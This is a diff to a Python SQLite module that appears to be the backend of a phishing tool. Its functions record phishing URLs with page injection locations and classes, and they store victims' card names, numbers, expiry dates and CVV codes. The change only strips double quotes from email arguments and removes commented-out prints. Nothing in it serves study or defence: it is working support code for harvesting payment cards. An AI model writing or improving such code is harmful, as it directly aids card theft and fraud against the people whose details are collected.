@@ -1,8 +1,6 @@
 import sqlite3
 
 def get_phish_code(email, url):
-    # print email
-    # print url
     conn = sqlite3.connect("data.db")
     c = conn.cursor()
     q = """SELECT *
@@ -37,7 +35,7 @@ def add_phish(userEmail, email, name, number, month, year, cvv):
     c = conn.cursor()
     q = """INSERT INTO Card
     Values (?, ?, ?, ?, ?, ?, ?)"""
-    c.execute(q, (userEmail, email, name, number, month, year, cvv))
+    c.execute(q, (userEmail, email.replace("\"", ""), name, number, month, year, cvv))
     conn.commit()
     conn.close()
 
@@ -46,7 +44,7 @@ def get_cards(email):
     c = conn.cursor()
     q = """SELECT * FROM Card
     WHERE EmailIP=?"""
-    data = c.execute(q, (email,)).fetchall()
+    data = c.execute(q, (email.replace("\"", ""),)).fetchall()
     return [x for x in data]
 
 
@@ -56,7 +54,7 @@ def get_phish_by_user(email):
     q = """SELECT * 
     FROM Phish
     WHERE EmailIP=?"""
-    data = c.execute(q, (email,)).fetchall()
+    data = c.execute(q, (email.replace("\"", ""),)).fetchall()
     conn.commit()
     conn.close()
     return [x[1:] for x in data]
@@ -66,7 +64,7 @@ def remove_phish_url(email, url):
     c = conn.cursor()
     q = """DELETE FROM Phish
     WHERE EmailIP=? AND Url=?"""
-    c.execute(q, (email, url))
+    c.execute(q, (email.replace("\"", ""), url))
     conn.commit()
     conn.close()
 
@@ -75,6 +73,6 @@ def add_phish_url(email, url, injectLoc, injectClass):
     c = conn.cursor()
     q = """INSERT INTO Phish
     Values (?,?,?,?)"""
-    c.execute(q, (email, url, injectLoc, injectClass))
+    c.execute(q, (email.replace("\"", ""), url, injectLoc, injectClass))
     conn.commit()
     conn.close()
